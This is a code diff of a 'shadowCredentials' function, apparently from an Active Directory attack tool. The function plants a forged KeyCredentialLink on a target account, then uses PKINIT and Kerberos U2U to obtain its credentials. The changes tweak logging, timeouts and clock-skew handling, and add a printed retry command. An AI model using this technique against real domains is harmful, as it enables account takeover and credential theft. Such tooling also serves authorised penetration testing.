@@ -478,7 +478,7 @@ def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
             LOG.error("No DC with Windows Server 2016 or higher found on this domain, operation aborted")
             return
         LOG.warning(
-            "[!] This DC does not seem to support KeyCredentialLink"
+            "This DC does not seem to support KeyCredentialLink"
         )
 
         LOG.info(f"Attempting alternative DCs with KeyCredentialLink support: {compatible_dcs}")
@@ -492,7 +492,7 @@ def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
         target_dn = entry["distinguishedName"]
         target_sAMAccountName = entry["sAMAccountName"]
     if path == "CurrentPath":
-        path = target_sAMAccountName + "_" + "".join(
+        path = target_sAMAccountName.strip('$') + "_" + "".join(
             random.choice(string.ascii_letters + string.digits) for i in range(2)
         )
 
@@ -517,7 +517,7 @@ def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
     keyCredential.keyCredentialLink_from_x509(cert)
 
     LOG.info(
-        "[+] KeyCredential generated with following sha256 of RSA key: %s"
+        "KeyCredential generated with following sha256 of RSA key: %s"
         % binascii.hexlify(keyCredential.getKeyID()).decode()
     )
 
@@ -543,15 +543,16 @@ def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
 
     client = None
     try:
-        url = f"kerberos+pfxstr://{conn.conf.domain}\\{target_sAMAccountName}@{conn.conf.dcip}/?certdata={pfx_base64}"
+        url = f"kerberos+pfxstr://{conn.conf.domain}\\{target_sAMAccountName}@{conn.conf.dcip}/?certdata={pfx_base64}&timeout=350"
         cu = factory.KerberosClientFactory.from_url(url)
         client = cu.get_client_blocking()
-        tgs, enctgs, key, decticket = client.U2U()
+        tgs, enctgs, key, decticket = client.with_clock_skew(client.U2U)
     except Exception as e:
         pfx_path = path + ".pfx"
         with open(pfx_path, "wb") as f:
             f.write(pfx)
         LOG.error(f"PKINIT failed on DC {conn.conf.dcip}, you must find a Kerberos server with a certification authority!")
+        LOG.error(f"Retry on a working KDC and do:\nbadNTPKInit 'kerberos+pfx://{conn.conf.domain}\\{target_sAMAccountName}@{conn.conf.dcip}/?certdata={pfx_base64}&timeout=350'")
         LOG.info(f"PKINIT PFX certificate saved at: %s" % pfx_path)
         raise e
     finally:
